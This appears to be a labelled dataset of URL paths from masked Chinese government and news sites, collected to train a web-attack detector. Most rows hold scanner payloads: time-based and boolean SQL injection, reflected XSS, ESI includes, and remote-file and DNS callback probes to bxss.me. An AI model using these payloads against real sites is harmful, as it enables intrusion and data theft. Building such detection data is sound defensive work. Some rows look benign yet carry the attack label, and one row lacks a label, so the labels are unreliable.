sentences	labels
newscenter/******/2020/11/27/javascript:void(); 	 1
newscenter/******/2021/09/07'"/><script>alert(775)</script>/013447361.shtml 	 1
zwgk/******/czzjzdjc/\"javascript:void(0)\" 	 1
was5/***/search?searchword=1&channelid=287219%' or 3851=3851 and '%%'='%&perpage=24&templet=1&token=1 	 1
qhly/******/2021/11/24/javascript:window.close(); 	 1
module/********/downfile.jsp?classid=0' and 9723=8406 and 'nkgr'='nkgr&filename=5e843683d0fe4948a646311bf154afc6.doc 	 1
vc/**/widgets/cookie'||'/jquery.cookie.js 	 1
ztzl/********/wzqh_gzbs/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
mall/****/goods.list.html?key=hi' or 'a'='a 	 1
gjcp/******/201411/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
system/********/interview/room.jsp?wbinterviewid=1033') or 3391=5655  	 1
brp/*****/tohome.z?editionmodelval=0'||(pg_sleep(8.0))||' 	 1
zwgk/******/ncwywfgz/if(now()=sysdate(),sleep(12),0)/plq/xmb_gzdxb.htm 	 1
swld/******/2021/10/15/javascript:window.close(); 	 1
jsearchfront/http://*******/t/fit.txt?.jpg/jcse/110105008056111/16/images/hanweb.css 	 1
index/******/2012/04/26/010753524_01.shtml 	 1
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/js/ajax.js 	 1
aux/wp-content/*******/dzs-videogallery/admin/playlistseditor/popup.php?initer=whatava18642';alert(777)//645 	 1
vc/ui"" and 2*3*8=6*8 and ""7rea""=""7rea/***/easyui/plugins/jquery.parser.js 	 1
col/******/'""()&%<acx><script >jjtk(9014)</script>.html 	 1
en/***********/news/' and 'x'='y 	 1
jsearchfront/******/mainframe.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 	 1
qhly/******/2013/01/15/javascript:dozoom(9) 	 1
art'||'/****/10/12/art_31_242356.html 	 1
ddjs/****/" and "x"="y 	 1
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*******/gys/jyx.htm 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24) and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&templet=1&token=1 	 1
com1/******/common/newaccount.aspx?email=alert(777) 	 1
newscenter/******/2015/09/07/011813664.shtml 	 1
zfld/******/"'><img src="/wf_xsrf1590.html">/013446963.shtml 	 1
was5/***/search?channelid=254846&searchword=?????? and 1>1 	 1
z/161208-1/*****/http://bxss.me/t/xss.html? 	 1
system/********/interview/room.jsp?wbinterviewid=1033%' and 1091=7963 and '%'='&owner=1707212448 	 1
newscenter/******/2021/11/23/javascript:window.close(); 	 1
socket.gethostbyname(""hitla"" ""rrwjekob50e43.bxss.me."")[3].to_s) ""/**/widgets/scrollup/css/themes/image.css 	 1
art"" and 2*3*8=6*8 and ""idak""=""idak/****/10/11/art_34_242318.html 	 1
lccp/********/javascript:void(0); 	 1
newscenter/****/javascript:window.close(); 	 1
zwgk/******/rsrm/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
zwxx/****/moon.php 	 1
gjcp/*****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
vc/http://*******/t/fit.txt?.jpg.do 	 1
system/********/js/jquery/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.js 	 1
index/******/2021/11/16/javascript:window.print() 	 1
was5/***/search?channelid=234439&orderby=relevance&perpage=24) and if(now()=sysdate(),sleep(0),0)/*'xor(if(now()=sysdate(),sleep(0),0))or'""xor(if(now()=sysdate(),sleep(0),0))or""*/&searchword=1 	 1
index/******/2021/11/22/javascript:window.close(); 	 1
was5/*****/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 1
newscenter/******/2013/08/28/011173524_04.shtml 	 1
es/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 1
ldzc/****//xfs.bxss.me/t20200119_146666.html 	 1
index.php/*****/login/index.html?fromurl=st4r7s<d3v	onmouseover
qhly/******/2021/10/22/javascript:dozoom(9) 	 1
xwzx/****/mt16/ 	 1
index/****/js/data.js/""><script>alert(337)</script> 	 1
ywly/*****/index.html?continent=%' or 9906=8813  	 1
pic/***/003/109/ 	 1
newscenter/******/2021/11/17/javascript:window.close(); 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(559)">?_=1630311512775 	 1
aux//*******/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 1
nbfw/*****/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" 	 1
yqlj/****/tipsloginsubmit.action 	 1
was5/***/search/search?page=3';select pg_sleep(5)--&channelid=287219&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
swwj/******/2021/08/04/javascript:window.print() 	 1
2020zt/******/2020/08/04/javascript:window.print() 	 1
newscenter/******/2020/12/01/javascript:window.close(); 	 1
index/******/2021/01/07/javascript:void(); 	 1
2021zt/******/2021/06/09/013399706'""/><img src=javascript:alert(2309) .shtml 	 1
0'xor(if(now()=sysdate(),sleep(0),0))xor'z/****/bmleft.html 	 1
e/******/showinfo/?classid=11&id=10317'""()&%<acx><script >9wtx(9749)</script> 	 1
jsearchfront/**********/dimension.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&tpl=16&websiteid=110105008056111 	 1
gjcp/******/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php 	 1
jsearchfront/*******/jcse/110105008056111/16/images/hanweb.css 	 1
module/***/http://bxss.me/t/fit.txt?.jpg/theme/simple/css/jpage.css 	 1
inc/***/sources?resource=alert(/777/)&format=txt 	 1
jsearchfront/********/http://bxss.me/t/fit.txt?.jpg/110105008056111/16/images/plugin/selectpick/js.js 	 1
template/*****/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
vc/**/widgets/http://bxss.me/t/fit.txt/jquery.cookie.js 	 1
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271') and 5637=5637 and '1'='1 	 1
newscenter/******/2021/12/05/javascript:void(0); 	 1
xwzx/**********/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> 	 1
xxgk/******/" and "x"="y 	 1
0""xor(if(now()=sysdate(),sleep(12),0))xor""z/********/js/dynclicks.js 	 1
module/**********/visit.jsp/<img src="javascript:alert(5765)">?type=2&i_webid=1&i_columnid=11 	 1
jsearchfront/********/jcse/110105008056111/16/images//xfs.bxss.me/hotnews/js.js 	 1
newscenter/******/2020/04/05/javascript:window.close(); 	 1
ddjs/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
zwgk'||'/******/bzxajgc.htm 	 1
zwgk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/gys/bsj/zcwj.htm 	 1
qhly/******/2021/12/08/javascript:dozoom(14) 	 1
pic/*/00/36/17/361715_123833.png 	 1
zxgg/********/javascript:void(0); 	 1
was5/***/search?page=2&channelid=253477 and 7151=9841#&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
gygj/**********/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> 	 1
was5/wp-content/*******/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= 	 1
es/****/xwygx/202109/t20210930_318020.html' and 'x'='x 	 1
newscenter/******/2021/11/05/javascript:void(0); 	 1
zwgk/http://*******/t/xss.html? 	 1
was5/***/search?searchword=1&channelid=287219&perpage=24%' or 8940=8940  	 1
zwgk/****/bmjs/zzqfyxt/plxrmfy/\"javascript:void(0)\" 	 1
module/********/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls and 5633=5633-- uyut 	 1
xwzx/********/javascript:void(0); 	 1
index/******/2020/07/28/javascript:void(); 	 1
2020zt/******/2020/10/16/javascript:window.print() 	 1
jsearchfront/********/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/searchbtn.js 	 1
if(now()=sysdate(),sleep(15),0)/*****/1088/1110/list.html 	 1
images"" and 2*3*8=6*8 and ""u3bu""=""u3bu/**/jquery.js 	 1
nul/wp-content/*******/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= 	 1
xq/******/common/newaccount.aspx?ddlculture=alert(777) 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 9814=0234 and '%%'='% 	 1
'""()&%<acx><script >iubl(9063)</script>/**/lib/easyui/themes/bootstrap/messager.css 	 1
ztpd/******/count/0036001/012000000000/window.location.href 	 1
zwgk/****/bmjs/zzqzfzcbmyzstsjg/zzqsthjt/\"javascript:void(0)\" 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 9215=7103 and '%'=' 	 1
rlzy/****/javascript:stranbody(); 	 1
jsearchfront/********/jcse/bxss.me/16/images/ui.css 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(896)</script>?_=1630311635977 	 1
module/*****/if(now()=sysdate(),sleep(15),0)/urite.min.js 	 1
2016zt/****/" target="_blank"><img src="img3/7.jp 	 1
include/******/yunke.php 	 1
ywly/****/hjgc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
news/******/65807.htm?rand=2 and 9160=9160-- cltx 	 1
news/********/silutouzi?page=_cloud_eye_trainer_56524eb847014a30f03212dadb9defb9 	 1
index/******/2021/12/18/javascript:window.close(); 	 1
zwgk/****/bmjs/qtdw/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"")://javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"")httpjavascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 1
zwgk/****/bmjs/zzqrdcwh/\"javascript:void(0)\" 	 1
index/******/2020/12/01/javascript:void(); 	 1
news/********/fengxianfangfan?page=1 and 2915=2915# 	 1
video/genixcms-master/genixcms-master/*******/index.php?page=posts&q=1'alert(777) 	 1
ztpd/******/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
com1/****/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 	 1
e/******/viewclick/?addclick=1&classid=1 waitfor delay '0:0:9.468' -- &id=174 	 1
2021zt/******/2021/09/13/javascript:window.print() 	 1
hqxx/********/e108109965.html 	 1
2016zt/******/2016/08/25/javascript:void(); 	 1
2017zt/******/2018/02/01/javascript:void(); 	 1
nul/**********/index.php?rt="><script>alert(777);</script>&s=your_admin"><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e"><script>alert(777);</script> 	 1
shzr/******/index.php?tid=default&lid=en_uk&f_email="">alert(777) 	 1
nul/****/"><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
newscenter/******/2021/09/07'""/><script>alert(758)</script>/013447361.shtml 	 1
templates/********/index.aspx?nodeid=394%';select sleep(5) 	 1
xwzx/****/jtwxq/202012/t20201201_264201.html and 1=1 	 1
2012zt/******/2012/05/30/010783070_01.shtml 	 1
jsearchfront/**********/dimension.do?begin=&end=&eq=&oq=&p=1&pg=if(now()=sysdate(),sleep(15),0)&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 	 1
2017zt/******/2018/01/20/javascript:window.close(); 	 1
pic/*/00/93/65/936587_952378.png 	 1
ldzc'""()&%<acx><script >aavn(9571)</script>/*****/sz/202108/t20210806_185416.html 	 1
gygj/****/" and "x"="y 	 1
jinronglicai/*******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/2017-01-24/193.html 	 1
aux/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 1
vc/**/lib/'""()&%<acx><script >vrou(9770)</script>/themes/bootstrap/linkbutton.css 	 1
was5/***/search?channelid=234439&orderby=relevance&perpage=24) and 4015=4015#&searchword=1 	 1
pic/*/11/37/70/11377077_964578.jpg 	 1
news/********/silulvyou?page='""()&%<acx><script >ydch(9090)</script> 	 1
2020zt/******/2020/07/31/javascript:window.print() 	 1
newscenter/******/2021/09/07/013447361'""/><img src=x onerror=alert(823)>.shtml 	 1
inc/****/magpierss/scripts/magpie_simple.php?url=""><img src= x onerror = alert(777)>url=""> 	 1
qywh/****/zrbg/ 	 1
public/*********/index/41730?did=4&period=3"">alert(/777/) 	 1
socket.gethostbyname(""hitxj"" ""smoajdhua2d6f.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js 	 1
module/**********/visit.jsp/<img src="javascript:alert(2076)">?type=3&i_webid=1&i_columnid=392&i_articleid=192569 	 1
was5/***/search?searchword=-1 or 2295=2295#&channelid=287219&perpage=24&templet=1&token=1 	 1
xwdt/****/czjs/if(now()=sysdate(),sleep(12),0).htm 	 1
was5/*****/system.html?step=2&device=et"/><script>alert(777);</script>bh0 	 1
news/**************/canada 	 1
module/********/downfile.jsp?classid=0&filename=278851335f24465a9715e09ab5f36d60.docx and 4422=4422-- mbyg 	 1
vc/ui'||'/***/easyui/themes/bootstrap/panel.css 	 1
zwgk/****/bmyjs/zzqdwgzbmyxsjg/zzqdwbgt/\"javascript:void(0)\" 	 1
module/********/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls and 2277=4310 	 1
newscenter/******/2021/10/19/javascript:window.close(); 	 1
jsearchfront/template"" and 2*3*8=6*8 and ""1uam""=""1uam/****/110105008056111/16/images/common.js 	 1
ywly/*****/" and "x"="y 	 1
xxgk/*****/1088/1096/list.html?new=bxss.me 	 1
publish/*****/10596/25100/25123/2015/12/02/20151202100210095375683/javascript:; 	 1
'.gethostbyname(lc('hitrx'.'lqiqakzzfc6fe.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(99).chr(71).chr(111).chr(78).'/****/bmjs/gdyx/ 	 1
video/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 1
2016zt/****/""><script>alert(34)</script> 	 1
jsearchfront/********/jcse/110105008056111/http://bxss.me/t/fit.txt?.jpg/images/plugin/waterpull/pinterest_grid.js 	 1
dcwj/*****/dash_additem.php?additem_form=alert(777); 	 1
bxss.me/******/fdzdgknr/qtfdxx/ 	 1
lz/******/2021/05/11/javascript:void(0); 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/websitechange'||'/zwdt_v3.css 	 1
xwzx/****/2020_jtyw/202012/t20201222_268160.html' and 'x'='x 	 1
vc/ui'||'/*******/validity/validity.js 	 1
investors-garden/**********/graphic%' and 2*3*8=6*8 and 'q9jz'!='q9jz%/2020-02-27/8981.html 	 1
inc/****/calendar/agenda_list.php?type=personal' onmouseover='confirm(777)'/><!-- 	 1
ywly/*****/bmz/mxg/201412/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
cgi-bin/**********/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> 	 1
qhly/******/2008/10/19/javascript:window.print() 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(353)">?_=1630311371566 	 1
zwgk/******/fdzdgknr/qtfdxx/qzqd/202011/http://bxss.me/t/xss.html? 	 1
news/********/zixunfuwu?page=1 and 2648=2648# 	 1
'""()&%<acx><script >t5bf(9732)</script>/*/ 	 1
ldzc/****/swsj'||'/ 	 1
news/********/pinpaijianshe?page=*/-->'""></iframe></script></style></title></textarea><script >alert(03825)</script> 	 1
module/********/downfile.jsp?classid=0&filename=620cfd342eec49aab04f2e35c63427cf.docx') and 5309=5309 and ('mnwd'='mnwd 	 1
ztpd/******/wmjt/javascript:void(0); 	 1
ssjn/*******/t/xss.html? 	 1
2021zt/******/2021/06/09'"/><iframe src=javascript:alert(2331) /013399706.shtml 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(850)</script>?_=1630311617223 	 1
news/********/zijinqudao?page=1 and 4421=4421-- 	 1
zwgk/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gys.htm 	 1
2021zt/******/2021/06/09'""/>/</script/>/<svg/onload=alert(2371) width=100//>/013399706.shtml 	 1
zwgk/******/ncwywfgz/ycs' and 2*3*8=6*8 and 'ycio'='ycio/hlx/xmb_gzdxb.htm 	 1
2016zt/******/2017/07/05/javascript:void(0); 	 1
rlzy/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 1
socket.gethostbyname(""hitsi"" ""vqekvqfse01d8.bxss.me."")[3].to_s) ""/******/t20210806_185416.html 	 1
index/******/2021/11/09/javascript:window.close(); 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/bxss.me/zwdt_v3.css 	 1
qhly/******/2017/02/17/javascript:dozoom(14) 	 1
template/******/common/signin.aspx?cbautosignin=""alert(777) 	 1
video/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 1
xwzx/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
lz/******/2020/08/21/javascript:void(0); 	 1
cpsms/********/javascript:void(0); 	 1
lz/******/2021/06/28/javascript:void(0); 	 1
xwzx/****/2021_mtgz/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/t20210314_271326.html 	 1
ddjs/*************/ajax_managed_services.php 	 1
vc/ui'||'/***/easyui/themes/bootstrap/messager.css 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(590)</script>?_=1630311526105 	 1
xwzx/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 1
xxgk/*******/ybjsqzn'""()&%<acx><script >r8on(9899)</script>/list.html 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(3658)</script>?_=1630311991836 	 1
lz/******/2021/07/27/javascript:void(0); 	 1
bbs/******/<img src="javascript:alert(369)"> 	 1
if(now()=sysdate(),sleep(15),0)/****/2021_mtgz/202103/t20210314_271326.html 	 1
qhly/******/2016/03/29/javascript:window.print() 	 1
art/****/10/http://bxss.me/t/fit.txt/art_34_242318.html 	 1
index/******/2015/08/11/011788556.shtml 	 1
qhsw/******/2020/06/30/javascript:window.close(); 	 1
ywly/****/dlgc/javascript:stranbody(); 	 1
'""()&%<acx><script >ke7r(9230)</script>/********/jcse/110105008056111/16/images/result.css 	 1
was5/***/search?channelid=234439&orderby=relevance') and 5335=5335 and ('1'='1&perpage=24&searchword=1 	 1
socket.gethostbyname('hitqw' 'qynnbxhm93ba7.bxss.me.')[3].to_s) '/**/images/catesearchbtn.js 	 1
was5/***/search?channelid=253477&keyword=the' and 2*3*8=6*8 and 'mign'='mign&orderby=-docreltime&outlinepage=10&page=2&perpage=15&searchword=the 	 1
ztpd/wp-content/*******/dzs-videogallery/ajax.php?height=&source=6d27f""><script>alert(777)</script>894ba&type=&width= 	 1
kjcx/****/zjzj/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
lxwm/**********/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product 	 1
es/****/spzx/201810/t20181012_194903.html' and 'x'='x 	 1
cn/**/info_37.aspx?itemid=1524' and 4819=4819 and 'wuej'='wuej 	 1
jsearchfront/template'""()&%<acx><script >efoq(9521)</script>/****/110105008056111/16/images/hanweb.css 	 1
xxgk/*****/bxss.me/1105/list.html 	 1
index/****/qhxwkhd.shtml/"><script>alert(106)</script> 	 1
xxgk/"".gethostbyname(lc(""hitlq"".""apnbkpqu6333f.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(114).chr(86).chr(107).chr(78).""/***/zfxxgkml_2127/jytabljg_2061/list.html 	 1
2021zt/******/2021/02/22/javascript:void(); 	 1
socket.gethostbyname(""hitaj"" ""hnwgpuosb9993.bxss.me."")[3].to_s) ""/**/images/plugin/voice/hzrecorder.js 	 1
ldzc/****/202001/t20200119_/xfs.bxss.me.html 	 1
zwgk/****/bmyjs/zzqfyxt/szsszjrmfy/201903/encodeuricomponent(window.location.href) 	 1
zwgk/****/bmjs/http://bxss.me/t/fit.txt/ 	 1
was5/***/search?channelid=254846&searchword=天津') and 9086=(select 9086 from pg_sleep(5)) and ('kjbi'='kjbi 	 1
newscenter/******/2021/12/15/javascript:void(); 	 1
spzq/********/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
ztzl/config-browser/showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 1
xwzx/*******/index.php?pagename=</script><script>alert(777)</script><!-- 	 1
fxgg/********/javascript:void(0); 	 1
jsearchfront/**********/dimension.do?cateid=1&eq=&oq=&p=1&pg=15&pos=&pq=&q=请输入关键词&ranksign=&searchid=1'""()&%<acx><script >dr2p(9199)</script>&total=&tpl=16&websiteid=110105008056111 	 1
xxgk/*****/1088/1095/list.html?new=0.12735219527013664<esi:include src=""http://bxss.me/rpb.png""/> 	 1
newscenter/******/2021/12/19/javascript:void(0); 	 1
zfld/******/2021/11/05/javascript:window.close(); 	 1
system/********/interview/room.jsp?wbinterviewid=1033' and 3953=3818 and '1'='1&owner=1707212448 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(6765)">?_=1630312437488 	 1
lz/******/2021/11/15/javascript:void(0); 	 1
yqlj/******/common/newaccount.aspx?email=alert(777) 	 1
qywh/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 1
jsearchfront"" and 2*3*8=6*8 and ""pmc2""=""pmc2/********/jcse/110105008056111/16/images/view.js 	 1
investors-garden%' and 2*3*8=6*8 and 'ydyr'!='ydyr%/**********/graphic/2020-02-27/8981.html 	 1
newscenter/******/2021/11/30/javascript:window.print() 	 1
fxgg/********/javascript:void(0); 	 1
fr/*****/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user 	 1
xwzx/****/202009/t20200915_253522.html' and 'x'='x 	 1
zwxx_11337/****/202108/encodeuricomponent(window.location.href) 	 1
zwxx_11337/****/202007/encodeuricomponent(window.location.href) 	 1
jsearchfront/*******/jcse/110105008056111/16/images/jquery.waterfall.js 	 1
fr/******/common/signin.aspx?cbautosignin=""alert(777) 	 1
index/******/2020/05/04/javascript:void(); 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(372)">?_=1630311380750 	 1
index/******/2020/08/04/javascript:window.print() 	 1
index/******/2021/10/02/javascript:void(0); 	 1
zwgk/zdlygk%' and 2*3*8=6*8 and 'ma2k'!='ma2k%/********/wzs/qtxs/xmb_gzdxb.htm 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/bxss.me/pinterest_grid.js 	 1
was5/***/search?searchword=1&channelid=287219&perpage=-1 or 9111=6314#&templet=1&token=1 	 1
was5/***/search?channelid=299868&perpage=1000') and 1844=1844  	 1
z/210909-'""()&%<acx><script >9hvh(9102)</script>/*****/d00139fee967b9a5c83cbe1cd7e911f8.css 	 1
zxgg/********/javascript:void(0); 	 1
index/******/2020/10/14/javascript:window.close(); 	 1
module/***/rssfeed.jsp?colid=34' and 5511=5511 and 'ezaf'='ezaf 	 1
zwgk/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/gys/jyx.htm 	 1
module/********/downfile.jsp?classid=0' and 3223=3223 and 'lhuj'='lhuj&filename=f8c2ed3e25ea4c269bf2e627a90b568a.docx 	 1
index/******/2010/05/25/010129335.shtml 	 1
zwgk/******/ncwywfgz/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/hlx/xmb_gzdxb.htm 	 1
info/****/document.location.href 	 1
lz/****/javascript:void(0); 	 1
js/*******/gvideos.php?gid=1 and 1=1 	 1
zmhd/*****/hfswsj/'.gethostbyname(lc('hithn'.'fjdxhssdbd351.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(105).chr(75).chr(102).chr(84).'/t20210906_186411.html 	 1
vc/**/lib<esi:include src=""http://bxss.me/rpb.png""/>/security/sm2.js 	 1
news/********/silumaoyi?page=1</script><script>4dq6(9831)</script> 	 1
jsearchfront<esi:include src=""http://*******/rpb.png""/>/template/jcse/110105008056111/16/images/hanweb.css 	 1
jsearchfront/********/jcse/110105008056111/16/images'||'/plugin/websitechange/zwdt_v3.css 	 1
outurl/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
gg'||'/*****/index.html 	 1
system/resource' and 2*3*8=6*8 and 'rkpm'='rkpm/**/image/imagescroll.js 	 1
en/***********/tradeandservices/ 	 1
zwgk/******/bzxajgc/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm 	 1
was5/***/search?perpage=20&outlinepage=10&keyword=1)); waitfor delay '0:0:2&channelid=240998&searchword=1&page=10 	 1
lz/******/2021/04/22/javascript:void(0); 	 1
zmhd/*****/hfswsj/202109/'.gethostbyname(lc('hitsl'.'rgcsmdld45d3d.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(100).chr(86).chr(121).chr(77).'_186411.html 	 1
ywzzq/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 1
wla/*********/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270' and 2035=2035 and '1'='1 	 1
socket.gethostbyname(""hitwp"" ""cmjbbqhpe424a.bxss.me."")[3].to_s) ""/****/ 	 1
xwzx/************/index?search="">alert(/777/) 	 1
com1/*********/rest/threatfeeds/pagedjson?namepattern=&page=0&size=25&sortcol=address&sortdir="/><script>alert(777)</script> 	 1
outurl/******/common/newaccount.aspx?ddlculture=alert(777) 	 1
vc/**/widgets/validity/validity' and 2*3*8=6*8 and '8stv'='8stv.js 	 1
xxgk/******/202011/t20201113_255857.html' and 'x'='y 	 1
was5/***/search?page=2&channelid=253477 and 0012=5204--&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
qt/********/index.html?channelid=295157&searchword=0""xor(if(now()=sysdate(),sleep(15),0))xor""z 	 1
icons/genixcms-master/genixcms-master/*******/index.php?page=posts&q=1'alert(777) 	 1
zwgk/****/bmjs//xfs.bxss.me/ 	 1
zwgk/******/ 	 1
socket.gethostbyname(""hitgv"" ""atyepoqcfb626.bxss.me."")[3].to_s) ""/****/list.html 	 1
newscenter/******/2012/11/05/010943027_03.shtml 	 1
en/**************/csrreports/201908/t20190828_222708.html' and 'x'='y 	 1
news/********/silumaoyi?page=1 and 5282=8325-- 	 1
col/*****/bxss.me.html 	 1
module/**********/visit.jsp?i_columnid[0]==2and 3 in &i_columnid[1]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1074475338')))&i_webid=1&type=1 	 1
qt/****/index.html 	 1
shzr/*****/ and 1=1 	 1
script/*/http://bxss.me/t/fit.txt?.jpg.js 	 1
system/********/code/datainput.jsp?owner=' or 8062=8062 and '1'='1 	 1
cgi-bin/*********/admin/notificationpopup.php?new=1&type=cr&height=alert(777) 	 1
news/********/zijinqudao 	 1
z/****/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> 	 1
